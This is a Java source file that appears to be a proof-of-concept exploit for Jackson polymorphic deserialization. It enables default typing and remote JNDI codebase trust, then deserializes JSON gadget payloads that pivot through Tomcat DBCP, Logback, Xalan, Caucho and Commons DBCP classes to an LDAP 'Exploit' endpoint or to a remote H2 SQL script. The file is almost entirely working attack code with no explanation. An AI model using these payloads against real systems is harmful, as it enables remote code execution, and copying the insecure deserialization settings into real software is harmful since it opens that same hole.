package test;

/**
 * Hello world!
 *
 */
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;

import java.io.IOException;

public class App {
    public static void main(String[] args) throws IOException {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
        //String payload = "[\"com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://127.0.0.1:1389/Exploit\"}]";
        //String payload = "[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://127.0.0.1:1389/Exploit\"}]";
        //String payload = "[\"org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS\",{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/exec.sql'\"}]";
        //String payload = "[\"com.caucho.config.types.ResourceRef\",{\"lookupName\": \"ldap://127.0.0.1:1389/Exploit\"}]";
        String payload = "[\"org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource\", {\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\"}]";

        Object o = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(o);
    }
}
/*
public class App 
{
    public static void main( String[] args )
    {
        System.out.println( "Hello World!" );
    }
}
*/
